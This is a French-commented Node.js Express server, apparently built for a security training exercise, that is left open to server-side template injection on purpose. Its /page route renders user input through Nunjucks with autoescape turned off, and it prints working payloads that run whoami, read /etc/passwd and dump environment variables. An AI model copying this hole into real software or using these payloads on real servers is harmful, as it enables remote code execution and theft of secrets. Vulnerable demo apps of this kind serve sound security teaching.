const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const nunjucks = require("nunjucks");
const db = require("./src/db");
const app = express();

app.use(bodyParser.json());
app.use(express.static("public"));

// Configure Nunjucks for rendering templates
// ⚠️ VULNÉRABLE : autoescape désactivé pour les démos SSTI
nunjucks.configure({ autoescape: false });

const PORT = process.env.PORT || 3000;

// ------------------------
// API Routes
// ------------------------

// Add item to MongoDB
app.post("/api/add", async (req, res) => {
  try {
    const { text } = req.body;
    if (!text) return res.status(400).json({ error: "Text is required" });
    const collection = db.get().collection("items");
    await collection.insertOne({ text, addedAt: new Date() });
    res.json({ status: "OK" });
  } catch (err) {
    console.error("Insert failed:", err);
    res.status(500).json({ error: "Insert failed" });
  }
});

// List items from MongoDB
app.get("/api/list", async (req, res) => {
  try {
    const collection = db.get().collection("items");
    const items = await collection.find({}).toArray();
    res.json(items);
  } catch (err) {
    console.error("Read failed:", err);
    res.status(500).json({ error: "Read failed" });
  }
});

// Get pod name
app.get("/api/podname", (req, res) => {
  res.json({ podName: process.env.POD_NAME || "unknown" });
});

// Download wiz-exercise.txt
app.get("/download/wiz-exercise", (req, res) => {
  const filePath = path.join(__dirname, "public", "wiz-exercise.txt");
  res.download(filePath, "wiz-exercise.txt", (err) => {
    if (err) {
      console.error("Error downloading file:", err);
      res.status(500).send("File not found");
    }
  });
});

// ------------------------
// UI Routes
// ------------------------

// Serve main index.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Custom 404 page route - VULNÉRABLE à SSTI (DÉMO UNIQUEMENT)
app.get("/page", (req, res) => {
  const userInput = req.query.name || 'unknown';
  
  try {
    // ⚠️ VULNÉRABILITÉ INTENTIONNELLE - NE JAMAIS FAIRE EN PRODUCTION
    // L'input utilisateur est directement utilisé comme template Nunjucks
    const rendered = nunjucks.renderString(userInput);
    
    res.status(404).send(`
      <!DOCTYPE html>
      <html>
        <head>
          <title>404 - Page Not Found</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              max-width: 800px;
              margin: 50px auto;
              padding: 20px;
            }
            h1 { color: #d32f2f; }
            .warning {
              background: #fff3cd;
              border: 1px solid #ffc107;
              padding: 10px;
              margin-top: 20px;
              border-radius: 5px;
            }
            pre {
              background: #f5f5f5;
              padding: 15px;
              border-radius: 5px;
              overflow-x: auto;
            }
          </style>
        </head>
        <body>
          <h1>404 - Page Not Found</h1>
          <p>Unable to find: <strong>${rendered}</strong></p>
          <hr>
          <div class="warning">
            <strong>⚠️ Warning:</strong> Cette page est volontairement vulnérable à SSTI (Server-Side Template Injection) pour des fins éducatives uniquement.
          </div>
          <h3>Exemples de payloads SSTI pour Nunjucks :</h3>
          <pre>
# Test simple (calcul)
?name={{7*7}}

# Exécuter une commande
?name={{range.constructor("return global.process.mainModule.require('child_process').execSync('whoami').toString()")()}}

# Lire un fichier
?name={{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()")()}}

# Variables d'environnement
?name={{range.constructor("return JSON.stringify(global.process.env)")()}}

# Liste des fichiers
?name={{range.constructor("return global.process.mainModule.require('child_process').execSync('ls -la').toString()")()}}
          </pre>
          <p><a href="/">← Retour à l'accueil</a></p>
        </body>
      </html>
    `);
  } catch (err) {
    // Afficher l'erreur de manière détaillée pour le debug
    res.status(500).send(`
      <!DOCTYPE html>
      <html>
        <head>
          <title>Template Render Error</title>
          <style>
            body {
              font-family: 'Courier New', monospace;
              max-width: 1000px;
              margin: 30px auto;
              padding: 20px;
              background: #1e1e1e;
              color: #d4d4d4;
            }
            h1 { color: #f48771; }
            pre {
              background: #252526;
              padding: 20px;
              border-radius: 5px;
              overflow-x: auto;
              border-left: 3px solid #f48771;
            }
          </style>
        </head>
        <body>
          <h1>Template Render Error</h1>
          <pre>${err.stack}</pre>
          <p><a href="/page?name=test" style="color: #569cd6;">← Essayer avec un input simple</a></p>
        </body>
      </html>
    `);
  }
});

// Endpoint de santé pour les probes Kubernetes
app.get("/health", (req, res) => {
  res.status(200).send("OK");
});

// ------------------------
// Start server after DB is ready
// ------------------------

db.connect((err) => {
  if (err) {
    console.error("MongoDB connection failed:", err);
    process.exit(1);
  }
  console.log("Connected to MongoDB!");
  app.listen(PORT, () => {
    console.log(`App running at http://localhost:${PORT}`);
    console.log(`⚠️  SSTI Demo endpoint: http://localhost:${PORT}/page?name={{7*7}}`);
  });
});